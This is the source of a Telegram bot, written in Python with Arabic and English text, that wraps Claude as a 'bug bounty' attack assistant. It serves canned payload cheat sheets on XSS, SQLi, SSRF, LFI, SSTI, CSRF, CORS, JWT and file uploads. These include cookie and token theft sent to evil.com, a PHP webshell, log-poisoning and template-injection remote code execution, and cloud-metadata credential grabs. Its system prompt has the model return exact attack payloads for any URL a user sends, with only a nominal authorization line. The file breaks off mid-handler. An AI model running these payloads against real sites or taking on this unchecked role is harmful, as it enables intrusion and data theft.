import os
import logging
import anthropic
import base64
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def load_knowledge_base():
    knowledge = ""
    knowledge_dir = "knowledge"
    if os.path.exists(knowledge_dir):
        for filename in sorted(os.listdir(knowledge_dir)):
            filepath = os.path.join(knowledge_dir, filename)
            if filename.endswith(".md") and os.path.isfile(filepath):
                with open(filepath, "r", encoding="utf-8") as f:
                    knowledge += f"\n\n{'='*60}\n# FILE: {filename}\n{'='*60}\n"
                    knowledge += f.read()
        vulns_dir = os.path.join(knowledge_dir, "vulns")
        if os.path.exists(vulns_dir):
            for filename in sorted(os.listdir(vulns_dir)):
                filepath = os.path.join(vulns_dir, filename)
                if filename.endswith(".md") and os.path.isfile(filepath):
                    with open(filepath, "r", encoding="utf-8") as f:
                        knowledge += f"\n\n{'='*60}\n# VULN: {filename}\n{'='*60}\n"
                        knowledge += f.read()
    return knowledge

KNOWLEDGE_BASE = load_knowledge_base()

SYSTEM_PROMPT = f"""You are an elite Bug Bounty Hunter and Web Security Expert.

Expertise: XSS, SQLi, IDOR/BOLA, SSRF, XXE, RCE, CSRF, JWT, OAuth,
Business Logic, Race Conditions, Subdomain Takeover, CORS, LFI, SSTI,
Prototype Pollution, HTTP Smuggling, GraphQL, API Security, Cloud Security, WAF Bypass.

== WEBSITE ANALYSIS PROTOCOL ==
When user sends ANY website URL, ALWAYS respond with:

🎯 TARGET: [URL]

🔍 DETECTED FEATURES:
🔴 CRITICAL SURFACE: [feature] → [attack]
🟠 HIGH SURFACE: [feature] → [attack]
🟡 MEDIUM SURFACE: [feature] → [attack]

⚡ IMMEDIATE ACTIONS (with exact payloads):
1. [exact command/payload]
2. [exact command/payload]
3. [exact command/payload]

🛠️ RECON COMMANDS:
[specific recon for this target]

📋 CHECKLIST:
[ ] Test 1
[ ] Test 2

== SCREENSHOT ANALYSIS PROTOCOL ==
When user sends a screenshot:
1. Identify page type and all visible elements
2. List ALL features visible
3. Map each feature to attack actions
4. Give exact payloads
5. Prioritize by impact

== HTTP REQUEST ANALYSIS PROTOCOL ==
When user sends HTTP request:
1. Identify endpoint and method
2. Analyze auth (JWT/session/API key)
3. Find all IDOR opportunities
4. List injection points with exact payloads
5. Check for mass assignment
6. Give modified requests for each attack

== FILE ANALYSIS PROTOCOL ==
When user sends a file:
1. Extract all endpoints, tokens, secrets
2. Build attack surface map
3. Give prioritized next steps

RULES:
- Only help with LEGAL security testing and authorized bug bounty programs
- Always verify target is in scope
- Emphasize responsible disclosure

Respond in same language as user (Arabic or English).
Be specific, technical, and actionable. Prioritize by impact.

KNOWLEDGE BASE:
{KNOWLEDGE_BASE}
"""

user_conversations = {}

def get_user_history(user_id):
    if user_id not in user_conversations:
        user_conversations[user_id] = []
    return user_conversations[user_id]

def add_to_history(user_id, role, content):
    history = get_user_history(user_id)
    history.append({"role": role, "content": content})
    if len(history) > 20:
        user_conversations[user_id] = history[-20:]

def detect_content_type(text):
    http_methods = ['GET ', 'POST ', 'PUT ', 'DELETE ', 'PATCH ', 'OPTIONS ', 'HEAD ']
    url_pattern = re.compile(r'https?://[^\s]+')
    js_exts = ['.js', '.json', 'config', 'settings', 'env', 'secret']
    if any(text.strip().startswith(m) for m in http_methods):
        return "http_request"
    urls = url_pattern.findall(text)
    if urls:
        url_lower = urls[0].lower()
        if any(x in url_lower for x in js_exts):
            return "url_js"
        return "url"
    return "question"

async def send_long_message(update, text):
    if len(text) > 4096:
        parts = [text[i:i+4096] for i in range(0, len(text), 4096)]
        for part in parts:
            await update.message.reply_text(part)
    else:
        await update.message.reply_text(text)

async def call_claude(user_id, prompt):
    add_to_history(user_id, "user", prompt)
    client = anthropic.Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))
    response = client.messages.create(
        model="claude-opus-4-5",
        max_tokens=2048,
        system=SYSTEM_PROMPT,
        messages=get_user_history(user_id)
    )
    result = response.content[0].text
    add_to_history(user_id, "assistant", result)
    return result

# ========== COMMANDS ==========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = (
        f"🎯 *مرحباً {user.first_name}!*\n\n"
        "أنا بوتك الخبير في *Bug Bounty Hunting* 🔐\n\n"
        "*أرسل لي:*\n"
        "🔗 URL موقع → تحليل features + attacks\n"
        "🖼️ Screenshot → تحليل فوري\n"
        "📋 HTTP Request → تحليل كامل\n"
        "📄 ملف → استخراج endpoints وsecrets\n"
        "💬 أي سؤال → إجابة احترافية\n\n"
        "*📌 الأوامر المتاحة:*\n\n"
        "*🔍 Recon:*\n"
        "/recon - أوامر الاستطلاع\n"
        "/asn - ASN Discovery\n"
        "/subdomain - Subdomain Enum\n"
        "/js - JS File Analysis\n"
        "/wayback - Wayback Machine\n"
        "/shodan - Shodan Queries\n"
        "/dork - Google Dorks\n"
        "/github\\_recon - GitHub Recon\n\n"
        "*🔥 Vulnerabilities:*\n"
        "/xss - XSS Attacks\n"
        "/sqli - SQL Injection\n"
        "/idor - IDOR/BOLA\n"
        "/ssrf - SSRF Attacks\n"
        "/xxe - XXE Injection\n"
        "/lfi - LFI/Path Traversal\n"
        "/ssti - SSTI Attacks\n"
        "/csrf - CSRF Attacks\n"
        "/jwt - JWT Attacks\n"
        "/cors - CORS Misconfig\n"
        "/oauth - OAuth Attacks\n"
        "/upload - File Upload\n"
        "/race - Race Conditions\n"
        "/graphql - GraphQL Attacks\n"
        "/cmdinject - Command Injection\n"
        "/redirect - Open Redirect\n"
        "/hostheader - Host Header\n"
        "/massassign - Mass Assignment\n"
        "/subtakeover - Subdomain Takeover\n"
        "/bizlogic - Business Logic\n\n"
        "*🛠️ Tools & Methods:*\n"
        "/tools - أدوات Bug Bounty\n"
        "/methodology - منهجية الاختبار\n"
        "/waf - WAF Bypass\n"
        "/403bypass - 403 Bypass\n"
        "/chains - Attack Chains\n"
        "/report - نموذج تقرير\n"
        "/payloads - Payload Lists\n"
        "/checklist - Testing Checklist\n\n"
        "/clear - مسح المحادثة\n\n"
        "⚠️ *للبرامج المصرح بها فقط*"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🛡️ *Bug Bounty Bot - كيف تستخدمه*\n\n"
        "*أرسل URL:*\n"
        "https://target.com\n"
        "→ يكشف كل features ويعطي attacks\n\n"
        "*أرسل JS file URL:*\n"
        "https://target.com/app.js\n"
        "→ يحلل secrets, source maps, endpoints\n\n"
        "*أرسل HTTP Request:*\n"
        "GET /api/user?id=123 HTTP/1.1\n"
        "Host: target.com\n"
        "→ يحلل auth + IDOR + injections\n\n"
        "*أرسل Screenshot:*\n"
        "📸 صورة من الموقع\n"
        "→ يحدد features ويقترح attacks\n\n"
        "*أرسل ملف:*\n"
        "📄 Burp log, recon output\n"
        "→ يستخرج endpoints وsecrets\n\n"
        "⚠️ للبرامج المصرح بها فقط!"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_conversations[update.effective_user.id] = []
    await update.message.reply_text("✅ تم مسح المحادثة!")

# ===== RECON COMMANDS =====

async def recon_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔍 *Recon - Quick Reference*\n\n"
        "*Subdomains:*\n"
        "```\nsubfinder -d target.com | httpx -silent\n"
        "amass enum -passive -d target.com\n"
        "assetfinder --subs-only target.com\n```\n\n"
        "*Screenshots:*\n"
        "```\ngowitness scan -f alive.txt\n```\n\n"
        "*CVE Scan:*\n"
        "```\nnuclei -l alive.txt -t cves/ -t exposures/\n```\n\n"
        "*Full Pipeline:*\n"
        "```\nsubfinder -d target.com | httpx -silent | \\\nnuclei -t cves/ -o results.txt\n```\n\n"
        "📌 أوامر تفصيلية:\n"
        "/asn /subdomain /shodan /wayback /dork /js"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def asn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🌐 *ASN Discovery*\n\n"
        "*Find ASN:*\n"
        "```\ncurl -s 'https://api.bgpview.io/search?query_term=Target+Company' | jq '.data.asns[].asn'\nwhois target.com | grep -i 'asn\\|org'\n```\n\n"
        "*Get IP Ranges from ASN:*\n"
        "```\ncurl 'https://api.bgpview.io/asn/12345/prefixes' | jq '.data.ipv4_prefixes[].prefix'\namass intel -asn 12345\n```\n\n"
        "*Shodan ASN Search:*\n"
        "```\nshodan search 'asn:AS12345' --fields ip_str,port,hostnames\n```\n\n"
        "*Scan ASN Range:*\n"
        "```\nnmap -sV --open -p 80,443,8080,8443 1.2.3.0/24\nmasscan -p80,443 1.2.3.0/24 --rate=1000\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def subdomain_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔍 *Subdomain Enumeration*\n\n"
        "*Passive:*\n"
        "```\nsubfinder -d target.com -all -o subs.txt\namass enum -passive -d target.com\nassetfinder --subs-only target.com\ncurl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u\n```\n\n"
        "*Active Brute Force:*\n"
        "```\npuredns bruteforce wordlist.txt target.com -r resolvers.txt\nffuf -u https://FUZZ.target.com -w wordlist.txt -mc 200,301,302\n```\n\n"
        "*Permutations:*\n"
        "```\ngotator -sub subs.txt -perm permutations.txt -o out.txt\naltdns -i subs.txt -o altdns_out.txt -w words.txt\n```\n\n"
        "*Combine & Probe:*\n"
        "```\ncat *.txt | sort -u | httpx -silent -title -status-code -o alive.txt\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def js_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📜 *JS File Analysis*\n\n"
        "*Find JS files:*\n"
        "```\ngau target.com | grep '\\.js$' | sort -u > js_files.txt\nkatana -u https://target.com -jc -d 3 | grep '\\.js'\n```\n\n"
        "*Extract Endpoints:*\n"
        "```\npython3 linkfinder.py -i https://target.com -d -o results.html\ncurl -s URL.js | grep -oE '\"(/api/[^\"]+)\"' | sort -u\n```\n\n"
        "*Find Secrets:*\n"
        "```\ncurl -s URL.js | grep -iE '(api_key|secret|token|password|aws|firebase)'\npython3 SecretFinder.py -i URL.js -o cli\n```\n\n"
        "*Source Maps (Jackpot!):*\n"
        "```\ncurl -s https://target.com/app.js.map | python3 -m json.tool\n# Contains original source code!\n```\n\n"
        "*Backup Files:*\n"
        "```\nhttps://target.com/app.js.bak\nhttps://target.com/app.js.old\nhttps://target.com/app.js~\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def wayback_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "⏰ *Wayback Machine Recon*\n\n"
        "*Get all historical URLs:*\n"
        "```\necho target.com | waybackurls > wayback.txt\ngau target.com > gau_urls.txt\n```\n\n"
        "*Filter interesting:*\n"
        "```\n# JS files\ncat gau_urls.txt | grep '\\.js$' | sort -u\n\n# Parameters\ncat gau_urls.txt | grep '?' | uro | sort -u\n\n# Admin/API\ncat gau_urls.txt | grep -iE '(admin|api|internal|backup|config)'\n\n# Old endpoints\ncat gau_urls.txt | grep -iE '(v1|v2|old|legacy|beta|dev)'\n```\n\n"
        "*Find deleted secrets:*\n"
        "```\ncurl 'https://web.archive.org/web/*/target.com/.env'\ncurl 'https://web.archive.org/web/*/target.com/config.php'\n```\n\n"
        "*Parameter discovery from Wayback:*\n"
        "```\ncat gau_urls.txt | grep '?' | uro | qsreplace FUZZ\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def shodan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔭 *Shodan Queries*\n\n"
        "*By Organization:*\n"
        "```\norg:\"Target Company\"\norg:\"Target\" http.title:\"Dashboard\"\norg:\"Target\" http.title:\"Admin\"\norg:\"Target\" http.title:\"Login\"\n```\n\n"
        "*By Domain/SSL:*\n"
        "```\nssl:\"target.com\"\nhostname:\"target.com\"\nssl.cert.subject.cn:\"target.com\"\n```\n\n"
        "*Find Juicy Services:*\n"
        "```\norg:\"Target\" product:\"Jenkins\"\norg:\"Target\" product:\"Grafana\"\norg:\"Target\" product:\"Kibana\"\norg:\"Target\" http.title:\"phpMyAdmin\"\norg:\"Target\" port:8080\norg:\"Target\" port:9200\norg:\"Target\" port:6379\n```\n\n"
        "*CLI Commands:*\n"
        "```\nshodan search 'org:\"Target\"' --fields ip_str,port,hostnames\nshodan host 1.2.3.4\nshodan download results 'org:\"Target\"'\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def dork_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔎 *Google Dorks*\n\n"
        "*Subdomains:*\n"
        "`site:*.target.com -www`\n\n"
        "*Sensitive Files:*\n"
        "`site:target.com ext:env OR ext:sql OR ext:log`\n"
        "`site:target.com ext:bak OR ext:backup OR ext:old`\n"
        "`site:target.com ext:xml OR ext:json OR ext:yaml`\n\n"
        "*Admin & Login:*\n"
        "`site:target.com inurl:admin OR inurl:login`\n"
        "`site:target.com inurl:dashboard OR inurl:panel`\n\n"
        "*API:*\n"
        "`site:target.com inurl:api OR inurl:v1 OR inurl:v2`\n"
        "`site:target.com inurl:swagger OR inurl:graphql`\n\n"
        "*Errors & Debug:*\n"
        "`site:target.com \"Warning: mysql\" OR \"SQL syntax\"`\n"
        "`site:target.com \"Fatal error\" OR \"stack trace\"`\n\n"
        "*Exposed Files:*\n"
        "`site:target.com \"index of /\"`\n"
        "`site:target.com intitle:\"index of\" config`\n\n"
        "*Secrets:*\n"
        "`site:target.com \"api_key\" OR \"apikey\"`\n"
        "`site:github.com \"target.com\" password`"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def github_recon_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🐙 *GitHub Recon*\n\n"
        "*Manual Search (GitHub.com):*\n"
        "```\norg:target api_key\norg:target password\norg:target secret\norg:target token\n\"target.com\" api_key\n\"target.com\" BEGIN RSA\n\"target.com\" PRIVATE KEY\n```\n\n"
        "*TruffleHog:*\n"
        "```\ntrufflehog github --org=target --only-verified\ntrufflehog github --repo=https://github.com/target/repo\n```\n\n"
        "*Gitleaks:*\n"
        "```\ngit clone https://github.com/target/repo\ngitleaks detect --source=./repo -v\n```\n\n"
        "*Git History Secrets:*\n"
        "```\ncd cloned_repo\ngit log --all --oneline\ngit show COMMIT_HASH\ntrufflehog git file://. --only-verified\n```\n\n"
        "*Find all repos:*\n"
        "```\ncurl 'https://api.github.com/orgs/target/repos?per_page=100'\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ===== VULNERABILITY COMMANDS =====

async def xss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔥 *XSS - Cross Site Scripting*\n\n"
        "*Basic Payloads:*\n"
        "```\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><img src=x onerror=alert(1)>\njavascript:alert(1)\n```\n\n"
        "*Account Takeover:*\n"
        "```\n<script>fetch('https://evil.com/?c='+document.cookie)</script>\n<script>fetch('https://evil.com/?t='+localStorage.getItem('token'))</script>\n```\n\n"
        "*Blind XSS:*\n"
        "```\n<script src=\"https://YOUR.xss.ht\"></script>\n\"><script src=\"https://YOUR.xss.ht\"></script>\n```\n\n"
        "*WAF Bypass:*\n"
        "```\n<ScRiPt>alert(1)</ScRiPt>\n<img src=x onerror=alert`1`>\n<svg><animate onbegin=alert(1) attributeName=x>\n```\n\n"
        "*Tools:*\n"
        "```\ndalfox url \"https://target.com/search?q=test\"\nxsstrike -u \"https://target.com/?q=test\"\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def sqli_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "💉 *SQL Injection*\n\n"
        "*Detection:*\n"
        "```\n'\n' OR 1=1--\n' AND SLEEP(5)--\n1; WAITFOR DELAY '0:0:5'--\n```\n\n"
        "*Auth Bypass:*\n"
        "```\nadmin'--\n' OR 1=1--\n' OR '1'='1\n```\n\n"
        "*Union Based:*\n"
        "```\n' ORDER BY 3--\n' UNION SELECT 1,2,3--\n' UNION SELECT username,password,3 FROM users--\n```\n\n"
        "*sqlmap:*\n"
        "```\nsqlmap -u \"https://target.com/?id=1\" --dbs --batch\nsqlmap -u \"https://target.com/?id=1\" -D db -T users --dump\nsqlmap -r request.txt --level=3 --risk=2\n```\n\n"
        "*NoSQL (MongoDB):*\n"
        "```\n{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}\n?user[$ne]=invalid&pass[$ne]=invalid\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def idor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔓 *IDOR / BOLA*\n\n"
        "*Where to Look:*\n"
        "```\n/api/users/1234 → change to 1235\n/api/orders/UUID → change UUID\n/download?file=invoice_1234.pdf\n```\n\n"
        "*Test Methods:*\n"
        "```\n# Horizontal IDOR\nGET /api/users/VICTIM_ID/data\nAuthorization: Bearer YOUR_TOKEN\n\n# Vertical IDOR\nGET /api/admin/users\nAuthorization: Bearer REGULAR_TOKEN\n```\n\n"
        "*Encoded IDs:*\n"
        "```\n# Base64: MTIzNA== → decode → 1234 → change → encode\necho -n '1235' | base64  # MTIzNQ==\n```\n\n"
        "*Autorize (Burp):*\n"
        "```\n1. Login as User A → copy token\n2. Login as User B\n3. Add User A token to Autorize\n4. Browse as User B\n5. Green = IDOR found!\n```\n\n"
        "*ffuf IDOR:*\n"
        "```\nffuf -u 'https://target.com/api/users/FUZZ' -w ids.txt -H 'Authorization: Bearer TOKEN' -mc 200\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def ssrf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🌐 *SSRF - Server Side Request Forgery*\n\n"
        "*Where to Look:*\n"
        "```\n?url= ?webhook= ?callback= ?src=\n?redirect= ?href= ?uri= ?path=\nPDF generators, image fetchers\nWebhook configs, Import from URL\n```\n\n"
        "*Cloud Metadata (Critical!):*\n"
        "```\n# AWS\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP\nhttp://metadata.google.internal/computeMetadata/v1/\n\n# Azure\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01\n```\n\n"
        "*Internal Services:*\n"
        "```\nhttp://127.0.0.1:6379/  # Redis\nhttp://127.0.0.1:9200/  # Elasticsearch\nhttp://127.0.0.1:8500/  # Consul\n```\n\n"
        "*Bypass Filters:*\n"
        "```\nhttp://2130706433/   # Decimal 127.0.0.1\nhttp://127.1/        # Short form\nhttp://[::1]/        # IPv6\n```\n\n"
        "*Blind SSRF:*\n"
        "```\nhttp://YOUR.burpcollaborator.net\nhttp://YOUR.interactsh.com\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def xxe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📄 *XXE - XML External Entity*\n\n"
        "*Basic File Read:*\n"
        "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n```\n\n"
        "*SSRF via XXE:*\n"
        "```xml\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>\n```\n\n"
        "*SVG Upload XXE:*\n"
        "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<svg><text>&xxe;</text></svg>\n```\n\n"
        "*XXE via DOCX:*\n"
        "```\n1. unzip file.docx\n2. Edit word/document.xml\n3. Add XXE payload\n4. rezip and upload\n```\n\n"
        "*Where to Find:*\n"
        "```\nSOAP APIs, XML Content-Type\nDOCX/XLSX/SVG uploads\nSAML authentication\nRSS/Atom feeds\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def lfi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📂 *LFI - Local File Inclusion*\n\n"
        "*Basic Payloads:*\n"
        "```\n?file=../../../../etc/passwd\n?page=../../../etc/shadow\n?include=../../../../windows/win.ini\n```\n\n"
        "*Filter Bypass:*\n"
        "```\n?file=..%252f..%252f..%252fetc/passwd\n?file=....//....//....//etc/passwd\n?file=../../../etc/passwd%00.php\n?file=..%c0%af..%c0%afetc/passwd\n```\n\n"
        "*PHP Wrappers (LFI→RCE):*\n"
        "```\n# Read source code\n?file=php://filter/convert.base64-encode/resource=index.php\n\n# Execute code\n?file=data://text/plain,<?php system('id');?>\n```\n\n"
        "*Log Poisoning → RCE:*\n"
        "```\n# 1. Poison log\ncurl target.com -H \"User-Agent: <?php system(\\$_GET['cmd']);?>\"\n\n# 2. Include log\n?file=../../../../var/log/apache2/access.log&cmd=id\n```\n\n"
        "*Sensitive Files:*\n"
        "```\n/etc/passwd, /etc/shadow\n/proc/self/environ\n/home/user/.ssh/id_rsa\n/.env, /var/www/html/config.php\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def ssti_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🖥️ *SSTI - Server Side Template Injection*\n\n"
        "*Detection:*\n"
        "```\n{{7*7}}    → 49  (Jinja2/Twig)\n${7*7}     → 49  (FreeMarker)\n<%= 7*7 %> → 49  (ERB)\n#{7*7}     → 49  (Ruby)\n```\n\n"
        "*Identify Engine:*\n"
        "```\n{{7*'7'}} → 7777777 = Jinja2\n{{7*'7'}} → 49 = Twig\n```\n\n"
        "*Jinja2 RCE:*\n"
        "```\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n```\n\n"
        "*Twig RCE:*\n"
        "```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n```\n\n"
        "*FreeMarker RCE:*\n"
        "```\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n```\n\n"
        "*Where to Find:*\n"
        "```\nProfile fields, email templates\nSearch queries, error messages\nReport generators, preview features\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def csrf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔄 *CSRF - Cross Site Request Forgery*\n\n"
        "*Basic PoC:*\n"
        "```html\n<html>\n<body onload=\"document.forms[0].submit()\">\n<form action=\"https://target.com/api/email\" method=\"POST\">\n<input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"/>\n</form>\n</body>\n</html>\n```\n\n"
        "*Token Bypass:*\n"
        "```\n1. Remove token entirely\n2. Use random value\n3. Use another user's token\n4. Change POST to GET\n5. Change Content-Type to text/plain\n```\n\n"
        "*JSON CSRF:*\n"
        "```javascript\nfetch('https://target.com/api/settings', {\n  method: 'POST',\n  credentials: 'include',\n  body: JSON.stringify({email: 'attacker@evil.com'})\n})\n```\n\n"
        "*Where to Find:*\n"
        "```\nChange email/password\nTransfer money\nDelete account\nProfile update\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def jwt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔑 *JWT Attacks*\n\n"
        "*Decode JWT:*\n"
        "```\necho 'PAYLOAD' | base64 -d\n# Or use jwt.io\n```\n\n"
        "*Algorithm None:*\n"
        "```\npython3 jwt_tool.py TOKEN -X a\n# Change alg to none → no signature needed\n```\n\n"
        "*Brute Force Secret:*\n"
        "```\nhashcat -a 0 -m 16500 token.txt rockyou.txt\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\n```\n\n"
        "*RS256 → HS256:*\n"
        "```\npython3 jwt_tool.py TOKEN -X k -pk public.pem\n```\n\n"
        "*kid Injection:*\n"
        "```\n{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 'key'-- -\"}\n```\n\n"
        "*jwt_tool Full Test:*\n"
        "```\npython3 jwt_tool.py TOKEN -t https://target.com/api -rh 'Authorization: Bearer TOKEN' -M at\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def cors_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🌍 *CORS Misconfiguration*\n\n"
        "*Detection:*\n"
        "```\ncurl -H 'Origin: https://evil.com' -I https://target.com/api/data\n\n# Vulnerable if response has:\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\n```\n\n"
        "*Exploit:*\n"
        "```javascript\nfetch('https://target.com/api/user/data', {\n  credentials: 'include'\n})\n.then(r => r.text())\n.then(d => fetch('https://evil.com/?data=' + btoa(d)))\n```\n\n"
        "*Bypass Techniques:*\n"
        "```\nOrigin: null\nOrigin: https://evil.target.com\nOrigin: https://target.com.evil.com\nOrigin: https://eviltarget.com\n```\n\n"
        "*Check with Nuclei:*\n"
        "```\nnuclei -u https://target.com -t misconfiguration/cors.yaml\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def oauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔐 *OAuth Attacks*\n\n"
        "*Open Redirect in redirect_uri:*\n"
        "```\nredirect_uri=https://target.com/redirect?url=https://evil.com\nredirect_uri=https://evil.com\nredirect_uri=https://target.com.evil.com/callback\n```\n\n"
        "*Missing State → CSRF:*\n"
        "```\n# No state parameter = OAuth CSRF\n# Attacker initiates → trick victim → attacker's account linked\n```\n\n"
        "*Scope Manipulation:*\n"
        "```\nscope=email profile → scope=email profile admin\n```\n\n"
        "*Token Theft Chain:*\n"
        "```\n1. Find OAuth with redirect_uri param\n2. Find open redirect on same domain\n3. Chain: redirect_uri=target.com/redirect?url=evil.com\n4. Victim auth → token to evil.com\n```\n\n"
        "*Authorization Code Reuse:*\n"
        "```\n1. Get auth code\n2. Use it (success)\n3. Use same code again\n4. If works = vulnerable\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📤 *File Upload Attacks*\n\n"
        "*Webshell Upload:*\n"
        "```\nshell.php → shell.php5 → shell.phtml\nshell.pHp → shell.php.jpg\nChange Content-Type: image/jpeg\nshell.php%00.jpg\n```\n\n"
        "*PHP Webshell:*\n"
        "```php\n<?php system($_GET['cmd']); ?>\n```\n\n"
        "*SVG XSS:*\n"
        "```xml\n<svg><script>alert(document.cookie)</script></svg>\n```\n\n"
        "*XXE via DOCX:*\n"
        "```\nunzip file.docx\n# Edit word/document.xml → add XXE\nzip -r malicious.docx .\n```\n\n"
        "*SSRF via Image URL:*\n"
        "```\nIf 'import from URL': use http://169.254.169.254/\n```\n\n"
        "*Path Traversal in filename:*\n"
        "```\n../../../../etc/passwd\n../config.php\n<img src=x onerror=alert(1)>.jpg\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def race_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🏁 *Race Conditions*\n\n"
        "*Where to Find:*\n"
        "```\nCoupon/discount codes\nGift card usage\nMoney transfers\nOne-time tokens\nVoting/liking systems\n```\n\n"
        "*Turbo Intruder (Burp):*\n"
        "```python\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(\n        endpoint=target.endpoint,\n        concurrentConnections=30)\n    for i in range(30):\n        engine.queue(target.req)\n```\n\n"
        "*curl Race:*\n"
        "```bash\nfor i in {1..20}; do\n  curl -s -X POST 'https://target.com/coupon/apply' \\\n    -H 'Authorization: Bearer TOKEN' \\\n    -d '{\"code\":\"SAVE50\"}' &\ndone; wait\n```\n\n"
        "*Python Race:*\n"
        "```python\nimport threading, requests\ndef apply():\n    requests.post('https://target.com/coupon',\n        headers={'Authorization': 'Bearer TOKEN'},\n        json={'code': 'SAVE50'})\nthreads = [threading.Thread(target=apply) for _ in range(20)]\n[t.start() for t in threads]\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def graphql_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📊 *GraphQL Attacks*\n\n"
        "*Find GraphQL:*\n"
        "```\n/graphql /api/graphql /graphql/v1\n/graphiql /playground /console\n```\n\n"
        "*Introspection:*\n"
        "```graphql\n{__schema{types{name fields{name}}}}\n{__schema{queryType{fields{name description}}}}\n```\n\n"
        "*IDOR via GraphQL:*\n"
        "```graphql\n{\n  user(id: \"OTHER_USER_ID\") {\n    email password privateData\n  }\n}\n```\n\n"
        "*Brute Force via Batching:*\n"
        "```json\n[\n{\"query\":\"mutation{login(email:\\\"admin\\\",password:\\\"pass1\\\"){token}}\"},\n{\"query\":\"mutation{login(email:\\\"admin\\\",password:\\\"pass2\\\"){token}}\"}\n]\n```\n\n"
        "*Tools:*\n"
        "```\npython3 -m graphql_cop -t https://target.com/graphql\npython3 -m clairvoyance https://target.com/graphql\n# InQL Burp Extension\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def cmdinject_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "💻 *Command Injection*\n\n"
        "*Basic Payloads:*\n"
        "```\n; id\n| id\n|| id\n& id\n&& id\n`id`\n$(id)\n```\n\n"
        "*Blind (Time-based):*\n"
        "```\n; sleep 5\n| sleep 5\n`sleep 5`\n$(sleep 5)\n```\n\n"
        "*Out-of-Band:*\n"
